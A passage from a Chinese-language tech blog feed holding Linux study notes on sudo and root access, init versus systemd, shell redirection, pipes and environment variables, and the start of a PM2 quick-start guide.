ALL&#x3D;(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"># 在其后面增加一行</span><br><span class="line">%wheel ALL&#x3D;(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>然后修改该用户，使其属于 root 组（wheel）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ usermod -g root boo</span><br></pre></td></tr></table></figure><p>修改完成之后，使用boo 用户登入，执行命令：<code>su -</code>，输入 root 账户的密码，即可获得root 权限。</p><p>方式三：（这里以ubuntu 为例）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line"># User privilege specification</span><br><span class="line">root    ALL&#x3D;(ALL:ALL) ALL</span><br><span class="line">boo ALL&#x3D;(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>修改完成之后，使用boo 用户登入，执行命令：<code>su -</code>，输入 root 账户的密码，即可获得root 权限。</p><p>方式二、方式三和方式一的区别就是：前者需要知道root 账户的密码，而后者可以直接以普通用户的身份或者管理员身份获取root 权限。</p><p>另外还有一个需要注意的地方就是：使用第一种方式获取 root 权限，其实也有弊端，弊端就是 <del>远程使用该用户登入时，还是需要输入 root 密码，才能验证身份成功，是的 必须输入 root 用户的密码。</del></p><p>事实证明，并非上面所述，ssh 连接时的确需要输入密码验证，但不是 root 用户的密码，之前之所以一直看到 <code>Permission denied, please try again.</code>这样的错误，只是因为 没有开启允许 root 用户远程登入的权限。如何开启，见下文扩展补充。</p><h3 id="扩展补充"><a href="#扩展补充" class="headerlink" title="扩展补充"></a>扩展补充</h3><h4 id="在Ubuntu中如何修改-root-密码"><a href="#在Ubuntu中如何修改-root-密码" class="headerlink" title="在Ubuntu中如何修改 root 密码"></a>在Ubuntu中如何修改 root 密码</h4><p>默认情况下，出于安全原因，root用户帐户密码在Ubuntu Linux 中被锁定。因此，无法使用root用户登录或使用诸如<code>su -</code>之类的命令成为超级用户。</p><p>但可以借助其他方式，使用<code>passwd</code>命令来修改。因为普通用户只能更改其帐户的密码。超级用户（root）可以更改任何用户帐户的密码（包括它自己）。</p><p>使用以下命令成为 root用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -i</span><br><span class="line">$ passwd root</span><br></pre></td></tr></table></figure><p>如果在sudo 命令使用不了的情况下，可以进入单用户模式，再进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ passwd root</span><br></pre></td></tr></table></figure><h4 id="在Ubuntu中如何远程-root-登入"><a href="#在Ubuntu中如何远程-root-登入" class="headerlink" title="在Ubuntu中如何远程 root 登入"></a>在Ubuntu中如何远程 root 登入</h4><p>在Ubuntu中，默认是不能使用 root 账户登入到系统的，如果一定想要用 root账户登入，可以编辑 sshd 配置，执行如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line"># PermitRootLogin prohibit-password</span><br><span class="line"># 修改为：</span><br><span class="line"># PermitRootLogin yes</span><br><span class="line"></span><br><span class="line"># 重启sshd 服务</span><br><span class="line">$ sudo systemctl restart sshd</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/li_101357/article/details/46778827" target="_blank" rel="noopener">adduser 和 useradd 的区别</a></li><li><a href="https://www.cnblogs.com/noway-neway/p/5235300.html" target="_blank" rel="noopener">Ubuntu 如何进入单用户模式</a></li><li><a href="https://raspberrypi.stackexchange.com/questions/48056/how-to-login-as-root-remotely" target="_blank" rel="noopener">ssh-如何远程以root 登入</a></li><li><a href="https://www.cyberciti.biz/faq/change-root-password-ubuntu-linux/" target="_blank" rel="noopener">如何在Ubuntu Linux 中更改 root 密码</a></li><li><a href="https://www.cyberciti.biz/faq/become-superuser-on-ubuntu-linux/" target="_blank" rel="noopener">如何使用su / sudo成为Ubuntu Linux的超级用户？</a></li><li><a href="https://www.cyberciti.biz/faq/ubuntu-linux-root-password-default-password/" target="_blank" rel="noopener">Ubuntu Linux root 用户默认密码</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;写这篇笔记的目的是：在 Linux 下经常为用户的权限问题而头疼，要么是权限不足，要么是权限太大，导致结果往往不是自己想要的。&lt;/p&gt;
&lt;p&gt;另外还有一个促使我写这篇笔记的原因就是：之前在 本地的 Ubuntu 上，竟然把用户玩坏了… 为了避免这种事情在服务器上发生，还是得深入研究下这一块。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux init、service、systemctl 这三者之间的区别</title>
    <link href="https://www.0x2beace.com/the-difference-between-linux-init-service-systemctl/"/>
    <id>https://www.0x2beace.com/the-difference-between-linux-init-service-systemctl/</id>
    <published>2020-07-14T15:38:00.000Z</published>
    <updated>2020-07-14T15:39:41.990Z</updated>
    
    <content type="html"><![CDATA[<p>在接触到Linux 的服务之后，我所知道的管理服务的方式有三种，分别是<code>init</code>、<code>service</code>、<code>systemctl</code>。</p><p>至于这三者之间的区别不得而知，所以整理这片笔记的目的就是了解这三者之间的区别。</p><a id="more"></a><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>历史上，Linux 的启动一直采用init 进程。</p><p>在类Unix 的计算机操作系统中，Init（初始化的简称）是在启动计算机系统期间启动的第一个进程。</p><p>Init 是一个守护进程，它将持续运行，直到系统关闭。它是所有其他进程的直接或间接的父进程。</p><p>因为init 的参数全在<code>/etc/init.d</code>目录下，所以使用 init 启动一个服务，应该这样做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start</span><br></pre></td></tr></table></figure><h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p>通过查看man 手册页可以得知，service是一个运行<code>System V init</code>的脚本命令。</p><blockquote><p>那么什么是 System V init 呢？</p></blockquote><p>也就是<code>/etc/init.d</code> 目录下的参数。</p><p>所以分析可知service 是去<code>/etc/init.d</code>目录下执行相关程序，服务配置文件的存放目录就是<code>/etc/init.d</code>.</p><p>使用 service 启动一个服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service nginx start</span><br></pre></td></tr></table></figure><p>可以理解成 service 就是<code>init.d</code> 的一种实现方式。<br>所以这两者启动方式（或者是停止、重启）并没有什么区别。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start</span><br><span class="line">&#x2F;&#x2F; 等价于</span><br><span class="line">$ service nginx start</span><br></pre></td></tr></table></figure><p>但是这两种方式均有如下缺点：</p><ol><li>启动时间长。init 进程是串行启动，只有前一个进程启动完，才会启动下一个进程。</li><li>启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。</li></ol><h2 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h2><p>Systemd 就是为了解决这些问题而诞生的。它包括 System and Service Manager，为系统的启动和管理提供一套完整的解决方案。<br>Systemd 是Linux 系统中最新的初始化系统（init），它主要的设计目的是克服 <code>System V init</code>固有的缺点，提高系统的启动速度。</p><p>根据 Linux 惯例，字母d是守护进程（daemon）的缩写。 Systemd 这个名字的含义，就是它要守护整个系统。</p><p>使用了 Systemd，就不需要再用init 了。Systemd 取代了initd（Initd 的PID 是0） ，成为系统的第一个进程（Systemd 的PID 等于 1），其他进程都是它的子进程。</p><p>Systemd 的优点是功能强大，使用方便，缺点是体系庞大，非常复杂。</p><p>查看Systemd 的版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl --version</span><br></pre></td></tr></table></figure><h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><p><strong>Systemd 并不是一个命令，而是一组命令</strong>，涉及到系统管理的方方面面。</p><h4 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h4><p>systemctl是 Systemd 的主命令，用于管理系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 重启系统</span><br><span class="line">$ sudo systemctl reboot</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 启动进入救援状态（单用户状态）</span><br><span class="line">$ sudo systemctl rescue</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 管理服务</span><br><span class="line">$ sudo systemctl start nginx</span><br></pre></td></tr></table></figure><h4 id="hostnamectl"><a href="#hostnamectl" class="headerlink" title="hostnamectl"></a>hostnamectl</h4><p>hostnamectl命令用于查看当前主机的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 显示当前主机信息</span><br><span class="line">$ hostnamectl</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置主机名</span><br><span class="line">$ sudo hostnamectl set-hostname BoodeUbuntu</span><br></pre></td></tr></table></figure><h4 id="localectl"><a href="#localectl" class="headerlink" title="localectl"></a>localectl</h4><p>localectl命令用于查看本地化设置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看本地化设置</span><br><span class="line">$ localectl</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置本地化参数。</span><br><span class="line">$ sudo localectl set-locale LANG&#x3D;en_GB.utf8</span><br><span class="line">$ sudo localectl set-keymap en_GB</span><br></pre></td></tr></table></figure><h4 id="timedatectl"><a href="#timedatectl" class="headerlink" title="timedatectl"></a>timedatectl</h4><p>timedatectl命令用于查看当前时区设置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看当前时区设置</span><br><span class="line">$ timedatectl</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 显示所有可用的时区</span><br><span class="line">$ timedatectl list-timezones                                                                                   </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置当前时区</span><br><span class="line">$ sudo timedatectl set-timezone America&#x2F;New_York</span><br><span class="line">$ sudo timedatectl set-time YYYY-MM-DD</span><br><span class="line">$ sudo timedatectl set-time HH:MM:SS</span><br></pre></td></tr></table></figure><p>总结一下，<code>init</code> 是最初的进程管理方式，<code>service</code> 是<code>init</code> 的另一种实现，而 <code>systemd</code> 则是一种取代 <code>initd</code> 的解决方案，其中 <code>systemctl</code> 是 <code>systemd</code> 的主命令，用于管理系统以及服务。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://en.wikipedia.org/wiki/Init" target="_blank" rel="noopener">Linux Init - 维基百科</a></li><li><a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html" target="_blank" rel="noopener">Systemd 入门教程 - 阮一峰的网络日志</a></li><li><a href="https://blog.csdn.net/lineuman/article/details/52578399" target="_blank" rel="noopener">init、service、systemctl 的区别</a></li><li><a href="http://www.ruanyifeng.com/blog/2016/02/linux-daemon.html" target="_blank" rel="noopener">Linux 守护进程的启动方式</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在接触到Linux 的服务之后，我所知道的管理服务的方式有三种，分别是&lt;code&gt;init&lt;/code&gt;、&lt;code&gt;service&lt;/code&gt;、&lt;code&gt;systemctl&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;至于这三者之间的区别不得而知，所以整理这片笔记的目的就是了解这三者之间的区别。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>了解 Linux的管道符、重定向、环境变量</title>
    <link href="https://www.0x2beace.com/understand-linux-pipe-symbols-redirects-environment-variables/"/>
    <id>https://www.0x2beace.com/understand-linux-pipe-symbols-redirects-environment-variables/</id>
    <published>2020-07-13T15:48:12.000Z</published>
    <updated>2020-07-14T15:49:18.916Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章浅谈一下 Linux 的管道符、重定向和环境变量。</p><a id="more"></a><h3 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h3><p>在了解什么是输入输出重定向之前，我们先要搞清楚以下两种输出信息的区别：</p><ul><li>标准输出信息：<br>包括该文件的一些相关权限、所有者、所属组、文件大小及修改时间等信息。</li><li>错误输出信息：<br>Bash终端显示的报错提示信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost 桌面]$ ls</span><br><span class="line">testdir   test.txt</span><br><span class="line">[max@localhost 桌面]$ cat test.txt</span><br><span class="line">Hello Linux!                        # 标准输出信息</span><br><span class="line">[max@localhost 桌面]$ cat xxx</span><br><span class="line">cat: xxx: 没有那个文件或目录        # 错误输出信息 因为不存在xxx文件</span><br></pre></td></tr></table></figure></li><li>标准输入重定向（STDIN，文件描述符为0）：默认从键盘输入，也可从其他文件或命令中输入。</li><li>标准输出重定向（STDOUT，文件描述符为1）：默认输出到屏幕。</li><li>错误输出重定向（STDERR，文件描述符为2）：默认输出到屏幕。</li></ul><p>之所以花这么大力气，理解这个概念，是因为待会有个很重要的知识点要用到这个概念。</p><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">命令 &gt; 文件        将标准输出重定向到一个文件中（清空原有文件的数据）</span><br><span class="line">命令 2&gt; 文件    将错误输出重定向到一个文件中（清空原有文件的数据）</span><br><span class="line">命令 &gt;&gt; 文件    将标准输出重定向到一个文件中（追加到原有内容的后面）</span><br><span class="line">命令 2&gt;&gt; 文件   将错误输出重定向到一个文件中（追加到原有内容的后面）</span><br><span class="line">命令 &gt;&gt; 文件 2&gt;&amp;1 或</span><br><span class="line">命令 &amp;&gt;&gt; 文件将标准输出与错误输出共同写入到文件中（追加到原有内容的后面）</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost 桌面]$ cat test.txt</span><br><span class="line">Hello Linux!</span><br><span class="line">[max@localhost 桌面]$ echo &quot;测试输出重定向(追加模式)&quot; &gt;&gt; test.txt</span><br><span class="line">[max@localhost 桌面]$ cat test.txt </span><br><span class="line">Hello Linux!</span><br><span class="line">测试输出重定向(追加模式)</span><br><span class="line"></span><br><span class="line">[max@localhost 桌面]$ echo &quot;测试输出重定向(清除模式)&quot; &gt; test.txt</span><br><span class="line">[max@localhost 桌面]$ cat test.txt</span><br><span class="line">测试输出重定向(清除模式)</span><br></pre></td></tr></table></figure><h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令 &lt; 文件将文件作为命令的标准输入</span><br><span class="line">命令 &lt;&lt; 分界符从标准输入中读入，直到遇见分界符才停止</span><br><span class="line">命令 &lt; 文件1 &gt; 文件2将文件1作为命令的标准输入并将标准输出到文件2</span><br></pre></td></tr></table></figure><p>输入重定向相对于输出重定向较使用的少一些，可以理解为：<strong>输入重定向的作用是把文件直接导入到命令中</strong>。<br>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将文件text.txt导入给 &#96;wc -l&#96;命令，统计行数。</span><br><span class="line">[max@localhost 桌面]$ wc -l &lt; test.txt</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>管道符的概念就是：把前一个命令原本要输出到屏幕的标准正常数据当作是后一个命令的标准输入。</p><p>举个例子，把<code>etc</code>目录下的所有文件的属性信息，作为标准输入传递给 <code>more</code>命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost 桌面]$ ls -l &#x2F;etc&#x2F; | more</span><br><span class="line">总用量 1396</span><br><span class="line">drwxr-xr-x.  3 root root       97 8月  24 04:35 abrt</span><br><span class="line">-rw-r--r--.  1 root root       16 8月  24 04:43 adjtime</span><br><span class="line">-rw-r--r--.  1 root root    21929 1月  29 2014 brltty.conf</span><br><span class="line">drwxr-xr-x.  2 root root        6 1月  29 2014 chkconfig.d</span><br><span class="line">-rw-r--r--.  1 root root     1157 2月   6 2014 chrony.conf</span><br><span class="line">--More--</span><br></pre></td></tr></table></figure><h3 id="命令行中的通配符"><a href="#命令行中的通配符" class="headerlink" title="命令行中的通配符"></a>命令行中的通配符</h3><ul><li>星号（*）代表匹配零个或多个字符</li><li>问号（?）代表匹配单个字符</li><li>中括号内加上数字[0-9]代表匹配0～9之间的单个数字的字符</li><li>而中括号内加上字母[abc]则是代表匹配a、b、c三个字符中的任意一个字符<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ ls</span><br><span class="line">file1  file2  file3  file99  filex</span><br><span class="line">[max@localhost test]$ ls -l file?</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file1</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file2</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file3</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 filex</span><br><span class="line">[max@localhost test]$ ls -l file*</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file1</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file2</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file3</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file99</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 filex</span><br><span class="line">[max@localhost test]$ ls -l file[1-2]</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file1</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file2</span><br><span class="line">[max@localhost test]$ ls -l file[x]</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 filex</span><br></pre></td></tr></table></figure><h3 id="常用的转义字符"><a href="#常用的转义字符" class="headerlink" title="常用的转义字符"></a>常用的转义字符</h3><blockquote><p>反斜杠（\）：使反斜杠后面的一个变量变为单纯的字符串。</p><p>单引号（’’）：转义其中所有的变量为单纯的字符串。</p><p>双引号（””）：保留其中的变量属性，不进行转义处理。</p><p>反引号（``）：把其中的命令执行后返回结果。</p></blockquote></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ PRICE&#x3D;5</span><br><span class="line">[max@localhost test]$ echo &quot;The price of this shirt is $PRICE&quot;</span><br><span class="line">The price of this shirt is 5</span><br></pre></td></tr></table></figure><p>上面的输出看上去挺对的，但是并不完美，我们希望能够输出“The price of this shirt is $5”，于是我们试着这样写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ echo &quot;The price of this shirt is $$PRICE&quot;</span><br><span class="line">The price of this shirt is 9944PRICE</span><br></pre></td></tr></table></figure><p>不幸的是美元符号和变量提取符号合并后<code>$$</code>作用是显示当前程序的进程ID。</p><p>要想让第一个<code>$</code>乖乖地作为美元符号，那么就需要使用反斜杠<code>\</code>来进行转义，将这个命令提取符转义成单纯的文本，去除其特殊功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ echo &quot;The price of this shirt is \$$PRICE&quot;</span><br><span class="line">The price of this shirt is $5</span><br></pre></td></tr></table></figure><p>如果只需要某个命令的输出值时，可以像<code>命令</code>这样，将命令用反引号括起来，达到预期的效果.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ echo &#96;uname -a&#96; &gt;&gt; file1</span><br><span class="line">[max@localhost test]$ cat file1</span><br><span class="line">Linux localhost.localdomain 3.10.0-123.el7.x86_64 #1 SMP Mon May 5 11:16:57 EDT 2014 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><blockquote><p>思考：如何将普通变量转换为全局变量？</p></blockquote><p>使用命令：<code>export [变量名称]</code>，需要在拥有管理员权限时才能正常使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost home]# WORKDIR&#x3D;&#x2F;home&#x2F;workdir</span><br><span class="line">[root@localhost home]# mkdir $WORKDIR </span><br><span class="line">[root@localhost home]# cd $WORKDIR</span><br><span class="line">[root@localhost workdir]# pwd</span><br><span class="line">&#x2F;home&#x2F;workdir</span><br><span class="line">[root@localhost workdir]# exit</span><br><span class="line">exit</span><br><span class="line">[max@localhost home]$ cd $WORKDIR</span><br><span class="line">[max@localhost ~]$ echo $WORKDIR</span><br><span class="line">[max@localhost ~]$ su root</span><br><span class="line">密码：</span><br><span class="line">[root@localhost max]# export WORKDIR</span><br><span class="line">[root@localhost &#x2F;]# su max</span><br><span class="line">[max@localhost &#x2F;]$ cd $WORKDIR</span><br><span class="line">[max@localhost workdir]$ pwd</span><br><span class="line">&#x2F;home&#x2F;workdir</span><br></pre></td></tr></table></figure><h4 id="重点一："><a href="#重点一：" class="headerlink" title="重点一："></a>重点一：</h4><p>在上面的命令中有一个很重要的知识点：</p><blockquote><p>关于如何在Linux中创建一个变量的问题？有两个地方需要注意。</p></blockquote><ol><li>所有字母都需要大写</li><li>变量与赋值符号(=)之间不能存在空格</li><li>无论是系统环境变量还是自定义变量还是全局变量，在调用时 都需要使用<code>$</code>符号来标识。</li></ol><h4 id="重点二"><a href="#重点二" class="headerlink" title="重点二"></a>重点二</h4><ul><li>在Linux 系统中当普通用户身份时命令提示符的前缀标识是：<code>$</code>。</li><li>在Linux 系统中当为管理员身份时命令提示符的前缀标识是：<code>#</code>。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇文章浅谈一下 Linux 的管道符、重定向和环境变量。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>PM2 快速上手</title>
    <link href="https://www.0x2beace.com/pm2-quick-start/"/>
    <id>https://www.0x2beace.com/pm2-quick-start/</id>
    <published>2020-07-12T13:44:47.000Z</published>
    <updated>2020-09-04T13:54:47.036Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://pm2.keymetrics.io/" target="_blank" rel="noopener">PM2</a> 是Node.js 生产环境中的进程管理工具，自带负载均衡功能。</p><a id="more"></a><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install pm2 -g</span><br></pre></td></tr></table></figure><p>无缝更新</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 update</span><br></pre></td></tr></table></figure><h2 id="启动应用"><a href="#启动应用" class="headerlink" title="启动应用"></a>启动应用</h2><p>PM2 中有两种方式启动应用，一种是<strong>直接调用应用入口文件</strong>，一种是<strong>通过调用配置文件启动应用</strong>。</p><h3 id="命令行启动"><a href="#命令行启动" class="headerlink" title="命令行启动"></a>命令行启动</h3><p>在生产环境中，通过命令行启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 stat app.js</span><br></pre></td></tr></table></figure><h3 id="配置文件启动"><a href="#配置文件启动" class="headerlink" title="配置文件启动"></a>配置文件启动</h3><p>很多时候，仅仅只是使用 <code>PM2</code> 去启动应用，可能不能完全满足我们的需求。</p><p>当需要对应用有更多的要求时，这个时候就需要用到<code>PM2</code> 的配置文件了。</p><p>PM2 支持通过配置文件创建管理应用，首先在项目根目录手动创建配置文件<code>precesses.json</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;apps&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;myApp&quot;,</span><br><span class="line">      &quot;cwd&quot;: &quot;&#x2F;var&#x2F;www&#x2F;app&#x2F;&quot;,</span><br><span class="line">      &quot;script&quot;: &quot;.&#x2F;app.js&quot;,</span><br><span class="line">      &quot;watch&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者直接使用 <code>pm2 init</code> 命令，自动创建默认的<code>ecosystem.config.js</code>配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  apps : [&#123;</span><br><span class="line">    name: &quot;myApp&quot;,</span><br><span class="line">    script: &#39;index.js&#39;,</span><br><span class="line">    watch: &#39;.&#39;</span><br><span class="line">  &#125;</span><br><span 